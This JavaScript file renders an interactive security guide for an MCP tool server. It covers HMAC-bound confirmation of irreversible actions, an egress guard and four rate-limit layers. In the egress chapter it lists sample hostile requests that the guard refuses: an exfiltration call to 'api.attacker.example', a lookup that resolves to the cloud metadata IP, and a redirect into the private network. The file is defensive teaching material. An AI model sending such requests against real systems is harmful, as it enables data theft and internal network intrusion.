/* Chapters 8–10: confirming an irreversible action, the egress guard, the four rate-limit layers. */
(function () {
  const { S, P, esc } = Guide;

  /* ---------- 8. Confirming an irreversible action ---------- */
  const L = { C: 110, P: 330, T: 550, API: 740 };
  const conf = [
    ['m1', 'C', 'P', 'call delete_project(id = "alpha")', 0, 'The client calls an Irreversible tool. (This template has none; <code>delete_project</code> is an illustration.)'],
    ['m2', 'P', 'P', 'introspect the token now · no cache', 0, 'Policy asks the issuer, right now, whether this token is still good. No cached answer is acceptable for this class.'],
    ['m3', 'P', 'T', 'invoke', 0, 'The call reaches the tool — but the tool will not act yet.'],
    ['m4', 'T', 'T', 'nonce = HMAC over sub, tool, args, time', 0, 'The tool computes a nonce: an HMAC over the caller, the tool, a hash of these exact arguments, and the time.'],
    ['m5', 'T', 'C', 'input required · carries the nonce', 1, 'Instead of a result, the client receives an input request carrying the nonce (SDK 2.x <code>InputRequiredException</code>).'],
    ['m6', 'C', 'C', 'a person confirms “delete alpha”', 0, 'The client shows the operation and collects an answer. The server cannot see this step — which is why it verifies the next one.'],
    ['m7', 'C', 'P', 'resume · arguments + nonce', 0, 'The client resumes the call, sending the arguments again together with the nonce.'],
    ['m8', 'P', 'P', 'introspect again · recompute HMAC · age < 120 s', 0, 'The resumed call is a new request, so it is introspected again. Policy recomputes the HMAC from what arrived and compares; the nonce must be under 120 seconds old.'],
    ['m9', 'P', 'T', 'proceed', 0, 'Everything matches.'],
    ['m10', 'T', 'API', 'perform the deletion', 0, 'Only now does the irreversible action happen.'],
    ['m11', 'API', 'T', 'done', 1, 'The upstream confirms.'],
    ['m12', 'T', 'C', 'result · mcp_tool_confirmed', 1, 'The result returns, and the confirmation is audited as <code>mcp_tool_confirmed</code>.'],
    ['m13', 'P', 'C', 'denied', 1, 'Policy refuses. Nothing reached the upstream.'],
  ];

  Guide.add({
    id: 'confirm',
    part: 'The call path',
    title: 'Confirming an irreversible action',
    lede: 'The server cannot make a client show a person anything. What it can do is refuse to act without a confirmation it can verify — bound to the exact arguments, so it cannot be answered in advance.',
    takeaway: 'Because the argument hash is inside the HMAC, a confirmation collected for a harmless call can never be spent on a damaging one — and the server stores nothing between the two halves.',
    refs: 'Roadmap §3.4 · Flowcharts §7',
    render(body) {
      const top = 80, gap = 34;
      const parts = [];
      [['C', ['MCP client'], 'untr'], ['P', ['Policy filter'], 'lane'], ['T', ['Tool'], 'lane'], ['API', ['Upstream'], 'untr']].forEach(([k, label, cls]) => {
        parts.push(`<line class="life" x1="${L[k]}" y1="52" x2="${L[k]}" y2="${top + 12 * gap + 20}"/>`);
        parts.push(S.node('L-' + k, L[k] - 60, 12, 120, 40, label, cls));
      });
      conf.forEach(([k, f, t, label, dash], i) => {
        const y = top + i * gap;
        if (f === t) parts.push(S.edge(k, `M${L[f] + 3} ${y - 6}h28v14h-24`, { label, lx: L[f] + 38, ly: y + 5, anchor: 'start' }));
        else {
          const dir = L[t] > L[f] ? 1 : -1;
          parts.push(S.edge(k, P.h(L[f] + 4 * dir, y, L[t] - 4 * dir), { dash: !!dash, deny: k === 'm13', label, lx: (L[f] + L[t]) / 2, ly: y - 6 }));
        }
      });
      const svg = S.svg(820, top + 12 * gap + 28, 'Confirmation round-trip: the tool answers with an input request carrying an HMAC nonce; the client resumes with the arguments and the nonce; policy recomputes and compares before the action proceeds.', parts.join(''));
      const st = Guide.stage({ svg, caption: 'The last row, in red, is the refusal path shared by every failed confirmation.' });
      body.appendChild(st);
      const upto8 = conf.slice(0, 8).map((m) => m[0]);
      Guide.scenarios(st, {
        lead: 'Scenario',
        say: Object.fromEntries(conf.map((m) => [m[0], m[5]])),
        list: [
          { label: 'Honest confirmation', path: conf.slice(0, 12).map((m) => m[0]), end: 'The same arguments came back with a fresh, matching nonce. The action ran, and the audit log holds <span class="ev pass">mcp_tool_confirmed</span>.' },
          { label: 'Arguments changed on resume', path: [...upto8, 'm13'], end: 'The client confirmed <code>alpha</code> but resumed with <code>id = "beta"</code>. The argument hash differs, so the recomputed HMAC does not match. <span class="ev deny">denied</span>' },
          { label: 'Replayed three minutes later', path: [...upto8, 'm13'], end: 'The nonce is genuine but older than 120 seconds. A captured confirmation cannot be saved and spent later. <span class="ev deny">denied</span>' },
          { label: 'Client cannot ask a person', path: [...conf.slice(0, 5).map((m) => m[0]), 'm13'], end: 'The client does not support input requests, so no confirmation can come back. The call is denied with a message that says exactly that. <span class="ev deny">denied</span>' },
        ],
      });
    },
  });

  /* ---------- 9. The egress guard ---------- */
  const erows = [
    ['E1', 'Host exactly on the provider’s list?', 'B1', '`mcp_egress_denied · host', 'gate'],
    ['E2', 'Scheme is https?', 'B2', '`mcp_egress_denied · scheme', 'gate'],
    ['E3', 'Method allowed for this provider?', 'B3', '`mcp_egress_denied · method', 'gate'],
    ['E4', 'Not carrying the caller’s own token?', 'B4', '`mcp_egress_denied · token leak', 'gate'],
    ['E5', 'Timeouts · retry · circuit breaker', null, null, ''],
    ['E6', 'Resolve DNS once', null, null, ''],
    ['E7', 'Resolved address is public?', 'B5', '`blocked · private or link-local', 'gate'],
    ['E8', 'Response is not a redirect?', 'B6', '`blocked · redirect not followed', 'gate'],
    ['E9', 'Body within MaxResponseBytes?', 'B7', '`aborted one byte past the cap', 'gate'],
    ['OKE', 'Payload read from the bounded stream', null, null, 'pass terminal'],
  ];
  const eorder = erows.map((r) => r[0]);
  const eUpTo = (g, b) => ['REQ', ...eorder.slice(0, eorder.indexOf(g) + 1), b];
  const EY = (r) => 52 + r * 36;
  const reqs = {
    ok: 'GET  https://opendata-download-metfcst.smhi.se/api/category/snow1g/…/data.json\nAuthorization: (none)\nresolves to → a public address\n←    200 OK · 68 KB (cap 1 MB)',
    host: 'GET  https://api.attacker.example/collect?d=…\n     host taken from a tool argument',
    scheme: 'GET  http://opendata-download-metfcst.smhi.se/api/…\n     plain http',
    method: 'POST https://opendata-download-metfcst.smhi.se/api/…\n     this provider allows GET only',
    leak: 'GET  https://opendata-download-metfcst.smhi.se/api/…\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIs…   ← the caller’s inbound token',
    dns: 'GET  https://opendata-download-metfcst.smhi.se/api/…\nresolves to → 169.254.169.254   ← cloud metadata address',
    redirect: 'GET  https://opendata-download-metfcst.smhi.se/api/…\n←    302 Found · Location: http://10.0.0.5/admin',
    big: 'GET  https://opendata-download-metfcst.smhi.se/api/…\n←    200 OK · streaming… 1 048 577 bytes read (cap 1 048 576)',
  };

  Guide.add({
    id: 'egress',
    part: 'The call path',
    title: 'The egress guard',
    lede: 'Provider code never constructs an HTTP client. It receives one the framework built, with this guard attached — which is what turns a provider’s allowance from a promise into a fact.',
    takeaway: 'Resolving DNS and connecting in one step closes the gap where a name looks safe at check time and points inward at use time. Not following redirects stops an allowed host from forwarding the request anywhere else.',
    refs: 'Roadmap §3.2, P2.6–P2.8, SPEC-03, SPEC-08 · Flowcharts §8',
    render(body) {
      const parts = [S.node('REQ', 170, 10, 280, 28, ['Provider calls its HttpClient']), S.edge('REQ>E1', P.v(310, 38, 52))];
      erows.forEach(([g, label, b, deny, cls], r) => {
        const y = EY(r);
        parts.push(S.node(g, 170, y, 280, 28, [label], cls));
        if (r < erows.length - 1) parts.push(S.edge(`${g}>${erows[r + 1][0]}`, P.v(310, y + 28, y + 36)));
        if (b) {
          parts.push(S.node(b, 490, y, 318, 28, [deny], 'deny'));
          parts.push(S.edge(`${g}>${b}`, P.h(450, y + 14, 490), { deny: true, label: 'no', lx: 470, ly: y + 10 }));
        }
      });
      [[0, 3, ['Egress guard']], [4, 4, ['Resilience']], [5, 8, ['Socket handler']], [9, 9, ['Provider']]].forEach(([a, b, label]) => {
        const y1 = EY(a) + 4, y2 = EY(b) + 24;
        parts.push(`<path class="brk" d="M158 ${y1}h-6V${y2}h6"/>`);
        parts.push(S.text(144, (y1 + y2) / 2 + 4, label[0], 'elabel', 'end'));
      });
      const svg = S.svg(820, EY(erows.length - 1) + 40, 'The egress guard checks host, scheme, method and token leakage; the socket handler resolves DNS once, rejects private addresses and redirects, and bounds the response size.', parts.join(''));
      const st = Guide.stage({ svg: `<pre class="console" data-req></pre><div style="height:10px"></div>${svg}` });
      body.appendChild(st);
      const req = st.querySelector('[data-req]');
      const list = [
        { label: 'Forecast request', path: ['REQ', ...eorder], r: 'ok', end: 'Allowed host, https, GET, no forwarded token, a public address, no redirect, and a body well under the cap. <span class="ev pass">allowed</span>' },
        { label: 'Host not on the list', path: eUpTo('E1', 'B1'), r: 'host', end: 'The only way a host outside the list gets here is through a tool argument. Refused before any connection. <span class="ev deny">mcp_egress_denied</span>, 5-point strike.' },
        { label: 'Plain http', path: eUpTo('E2', 'B2'), r: 'scheme', end: 'Unencrypted traffic is never sent, even to an allowed host. <span class="ev deny">mcp_egress_denied</span>' },
        { label: 'POST to a read-only provider', path: eUpTo('E3', 'B3'), r: 'method', end: 'The provider’s policy allows GET only, so a write can’t be smuggled through a read provider. <span class="ev deny">mcp_egress_denied</span>' },
        { label: 'Caller’s token forwarded', path: eUpTo('E4', 'B4'), r: 'leak', end: 'The outbound request carried the exact bearer token the caller presented. That is token passthrough, which the specification forbids. Aborted and logged. <span class="ev deny">mcp_egress_denied</span>' },
        { label: 'Name resolves to the metadata IP', path: eUpTo('E7', 'B5'), r: 'dns', end: 'The name is allowed, but DNS answered with a link-local address. The connection is refused before a byte is sent, and because the vetted address is the one used, a second lookup can’t swap it. <span class="ev deny">blocked</span>' },
        { label: 'Redirect to an internal host', path: eUpTo('E8', 'B6'), r: 'redirect', end: 'An allowed upstream answered with a redirect into the private network. Redirects are never followed. <span class="ev deny">blocked</span>' },
        { label: 'Oversized response', path: eUpTo('E9', 'B7'), r: 'big', end: 'The stream stopped one byte past the provider’s cap. Memory use is bounded by the cap, not by what the upstream chose to send. <span class="ev deny">aborted</span>' },
      ];
      Guide.scenarios(st, {
        lead: 'Outbound request',
        list,
        onPick: (s) => { req.textContent = reqs[s.r]; },
        say: {
          REQ: 'The tool asks its provider’s HTTP client for something. The request is inspected before it leaves.',
          E1: 'The host must match an entry in the provider’s <code>EgressPolicy.Hosts</code> exactly — no wildcards, no IP literals.',
          E2: 'Only https.',
          E3: 'The method must be one the provider declared.',
          E4: 'The outbound <code>Authorization</code> header is compared with the caller’s inbound token.',
          E5: 'Attempt timeout, total timeout, retries for idempotent methods, circuit breaker and concurrency limit — all from the provider’s policy.',
          E6: 'The name is resolved exactly once, inside the connection callback.',
          E7: 'The resolved address is checked against private, loopback, link-local and multicast ranges.',
          E8: 'Automatic redirects are off; a redirect response is treated as a refusal.',
          E9: 'The body is read through a bounded stream that throws one byte past the cap.',
          OKE: 'The payload is deserialised straight from the stream.',
        },
      });
    },
  });

  /* ---------- 10. The four rate-limit layers ---------- */
  const layers = [
    ['L1', 'Source IP', 'before authentication'],
    ['L2', 'idp:sub', 'one caller, all tools'],
    ['L3', 'idp:sub + tool', 'one caller, one tool'],
    ['L4', 'Provider', 'all callers, one upstream'],
  ];
  const sims = [
    { label: 'A person asking questions', v: { L1: [6, 120], L2: [6, 60], L3: [3, 10], L4: [6, 5000, 'today'] }, say: 'Six calls in a minute across three tools. Every layer has room to spare, and nobody notices the limits exist.' },
    { label: 'Agent looping on one tool', v: { L1: [16, 120], L2: [16, 60], L3: [16, 10, 'trip'], L4: [10, 5000, 'today'] }, ev: 'excess_rate_limit_exceeded', say: 'Sixteen calls to <code>get_forecast</code> in twenty seconds. L3 allows ten and refuses six. Each refusal is a 1-point strike, so the third throttles the caller and the sixth suspends it — chapter 11 follows what happens next. The upstream saw only ten calls.' },
    { label: 'One caller, many tools', v: { L1: [66, 120], L2: [66, 60, 'trip'], L3: [6, 10], L4: [60, 5000, 'today'] }, ev: 'excess_rate_limit_exceeded', say: 'Sixty-six calls spread over eleven tools, six each. No single tool is over its budget, so L3 is quiet — but L2 caps the caller’s total at sixty and refuses the last six.' },
    { label: 'Junk-token flood', v: { L1: [400, 120, 'trip'], L2: [0, 60], L3: [0, 10], L4: [0, 5000, 'today'] }, ev: '429', say: 'Four hundred requests with invalid tokens from one address. L1 refuses 280 of them with 429 before any signature is checked; the other 120 fail authentication. None reach L2–L4, and no strikes are recorded — there is no principal to strike. That is why L1 runs first.' },
    { label: 'Many callers, one upstream', v: { L1: [20, 120], L2: [1, 60], L3: [1, 10], L4: [20, 8, 'trip', 'at once'] }, ev: 'mcp_resource_exhaustion', say: 'Twenty different callers hit the demo provider in the same instant. Each is well within its own budget, but L4 allows eight concurrent upstream calls and refuses twelve. Nobody misbehaved, so nobody is struck; the limit protects the upstream and the bill.' },
  ];

  Guide.add({
    id: 'limits',
    part: 'The call path',
    title: 'The four rate-limit layers',
    lede: 'Four limits, each protecting something different. Pick a traffic pattern and watch which layer catches it — and which ones never see it.',
    takeaway: 'L1 exists for traffic with no identity; L2 and L3 are keyed on the principal and live in Redis, so they hold across every instance; L4 protects the upstream no matter who is calling.',
    refs: 'Roadmap §3.6 · Flowcharts §9 · Budgets shown are examples; L3 comes from each tool’s policy.',
    render(body) {
      const rowsHtml = layers.map(([k, key, what]) => `<div class="rl-row" data-l="${k}">
          <b class="mono">${k}</b><span><b>${key}</b><br><small>${what}</small></span>
          <div class="meter"><i></i></div><span class="num v"></span><span class="st"></span></div>`).join('');
      const st = Guide.stage({ svg: `<div class="inset"><div class="rl">${rowsHtml}</div></div>`, caption: 'Each bar is attempts against the layer’s budget over the window shown. Red means the layer refused traffic.' });
      body.appendChild(st);
      const bar = st.querySelector('.stage-bar'), narr = st.querySelector('.narr');
      bar.innerHTML = `<span class="lbl">Traffic</span>` + sims.map((s, i) => `<button type="button" class="chip" data-i="${i}" aria-pressed="false">${esc(s.label)}</button>`).join('');
      let run = 0;
      const pick = (i, animate) => {
        const token = ++run, s = sims[i];
        bar.querySelectorAll('.chip').forEach((b) => b.setAttribute('aria-pressed', String(+b.dataset.i === i)));
        const reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
        const frames = animate && !reduce ? 24 : 1;
        let f = 0;
        const tick = () => {
          if (token !== run) return;
          f++;
          layers.forEach(([k]) => {
            const [used, limit, flag, unit] = s.v[k];
            const shown = Math.round((used * f) / frames);
            const row = st.querySelector(`[data-l="${k}"]`);
            const tripped = flag === 'trip' && shown > limit;
            row.querySelector('.meter').className = 'meter' + (tripped ? ' trip' : shown > limit * 0.8 ? ' warn' : '');
            row.querySelector('.meter i').style.width = Math.min(100, (shown / limit) * 100) + '%';
            const per = unit === 'today' ? ' today' : unit === 'at once' ? ' at once' : ' / min';
            row.querySelector('.v').textContent = `${shown} / ${limit}${per}`;
            row.querySelector('.st').innerHTML = shown === 0 ? '<span class="pill">never reached</span>'
              : tripped ? `<span class="pill deny">refused ${shown - limit}</span>` : '<span class="pill pass">within budget</span>';
          });
          if (f < frames) setTimeout(tick, 45);
        };
        tick();
        narr.innerHTML = `<div class="step">${esc(s.label)}${s.ev ? ` · <span class="ev deny">${s.ev}</span>` : ''}</div><p>${s.say}</p>`;
      };
      bar.addEventListener('click', (e) => { const b = e.target.closest('.chip'); if (b) pick(+b.dataset.i, true); });
      pick(1, false);
    },
  });
})();
